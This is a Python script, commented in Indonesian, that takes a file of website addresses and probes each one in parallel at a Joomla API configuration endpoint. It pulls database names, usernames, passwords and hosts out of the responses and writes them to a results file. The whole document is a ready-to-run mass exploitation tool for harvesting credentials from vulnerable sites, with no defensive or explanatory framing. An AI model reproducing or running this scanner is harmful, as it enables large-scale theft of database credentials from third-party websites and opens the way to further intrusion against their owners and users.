import re
import requests
from multiprocessing.dummy import Pool as ThreadPool

# timeout untuk HTTP request
TIMEOUT = 5

# Meminta input nama file dari user
file_name = input("Masukkan nama file yang berisi daftar URL: ").strip()

# Membaca URL dari file yang diberikan oleh user
try:
    with open(file_name, "r") as file:
        urls = file.read().splitlines()
except FileNotFoundError:
    print(f"File '{file_name}' tidak ditemukan.")
    exit()

def process_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    url += "/api/index.php/v1/config/application?public=true"  # menambahkan path di akhir setiap URL
    try:
        # Membuat HTTP request ke URL
        response = requests.get(url, timeout=TIMEOUT)
        data = response.text

        # Menggunakan regex untuk mencari nilai data
        db = re.search(r'"db":"([^"]+)"', data)
        user = re.search(r'"user":"([^"]+)"', data)
        password = re.search(r'"password":"([^"]+)"', data)
        host = re.search(r'"host":"([^"]+)"', data)

        # Memeriksa apakah nilai data ditemukan atau tidak
        if db and user and password and host:
            # Memformat output sesuai dengan yang diminta
            output = f"{url}|{db.group(1)}|{user.group(1)}|{password.group(1)}|{host.group(1)}"

            # Menampilkan hasil di terminal
            print(f"Found: {output}")

            # Menyimpan hasilnya ke dalam file joomlagacor.txt
            with open("joomlagacor.txt", "a") as file:
                file.write(output + "\n")
        else:
            # Menampilkan pesan jika nilai data tidak ditemukan
            print(f"Not Found: {url}")
    except Exception:
        # Menampilkan pesan jika terjadi kesalahan saat HTTP request
        print(f"Error: {url}")

# Menggunakan threading untuk melakukan HTTP request secara paralel
with ThreadPool(50) as pool:
    pool.map(process_url, urls)

# Memproses hasil yang telah disimpan dalam joomlagacor.txt
try:
    with open("joomlagacor.txt", "r") as file:
        urls_data = file.read().splitlines()
except FileNotFoundError:
    print("File 'joomlagacor.txt' tidak ditemukan.")
    exit()

invalid_data = []  # List untuk menyimpan data yang tidak valid

def process_data(data):
    parts = data.split("|")
    if len(parts) != 5:
        print(f"Skipping invalid data: {data}")  # Debugging, untuk melihat data yang bermasalah
        invalid_data.append(data)  # Simpan ke list error
        return None
    url, db, user, password, host = parts
    return f"{url}|{db}|{user}|{password}|{host}"

with ThreadPool(50) as pool:
    hasil = pool.map(process_data, urls_data)

# Filter hasil yang None
hasil = [h for h in hasil if h is not None]

# Menyimpan hasil yang valid kembali ke joomlagacor.txt
with open("joomlagacor.txt", "w") as file:
    file.write("\n".join(hasil))

# Menyimpan data yang tidak valid ke error.txt
if invalid_data:
    with open("error.txt", "w") as file:
        file.write("\n".join(invalid_data))

print("Done! Check your 'joomlagacor.txt' and 'error.txt'")
